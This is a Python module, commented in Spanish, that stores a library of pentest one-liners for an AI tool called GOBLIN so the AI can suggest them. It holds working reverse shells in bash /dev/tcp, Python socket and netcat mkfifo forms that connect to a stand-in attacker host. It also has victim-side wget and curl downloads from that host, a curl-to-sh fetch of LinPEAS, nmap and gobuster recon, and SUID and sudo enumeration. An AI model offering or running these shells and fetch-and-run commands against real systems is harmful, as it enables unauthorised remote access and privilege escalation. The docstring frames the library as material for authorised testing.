"""
Biblioteca de snippets de pentest para GOBLIN (Spec 014).
One-liners comunes que la IA puede sugerir. Son plantillas educativas de uso común
en pentesting autorizado; el usuario sustituye IP/puerto según su engagement.
"""

SNIPPETS = {
    "reverse_shell": [
        ("Bash TCP", "bash -i >& /dev/tcp/ATACANTE/4444 0>&1"),
        ("Python", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATACANTE\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"),
        ("Netcat (mkfifo)", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATACANTE 4444 >/tmp/f"),
    ],
    "listener": [
        ("Netcat", "nc -lvnp 4444"),
        ("Rlwrap + nc (mejor TTY)", "rlwrap nc -lvnp 4444"),
    ],
    "transfer": [
        ("Servidor HTTP (atacante)", "python3 -m http.server 8000"),
        ("Descargar (víctima)", "wget http://ATACANTE:8000/archivo -O /tmp/archivo"),
        ("Descargar con curl", "curl http://ATACANTE:8000/archivo -o /tmp/archivo"),
    ],
    "tty_upgrade": [
        ("Spawn TTY python", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
        ("Estabilizar", "export TERM=xterm; stty raw -echo; fg"),
    ],
    "recon": [
        ("Nmap rápido", "nmap -sV -T4 OBJETIVO"),
        ("Nmap completo", "nmap -sC -sV -p- OBJETIVO -oN nmap_full.txt"),
        ("Enum web", "gobuster dir -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt"),
    ],
    "privesc": [
        ("LinPEAS", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
        ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
        ("Sudo -l", "sudo -l"),
    ],
}


def get_snippet(category: str = "") -> str:
    """Devuelve los snippets de una categoría, o la lista de categorías si no se da una."""
    cat = (category or "").lower().strip()
    if not cat or cat not in SNIPPETS:
        cats = ", ".join(SNIPPETS.keys())
        return f"Categorías de snippets disponibles: {cats}"
    lines = [f"Snippets de '{cat}' (sustituye ATACANTE/OBJETIVO/puerto según tu engagement):"]
    for name, code in SNIPPETS[cat]:
        lines.append(f"\n• {name}:\n  {code}")
    return "\n".join(lines)
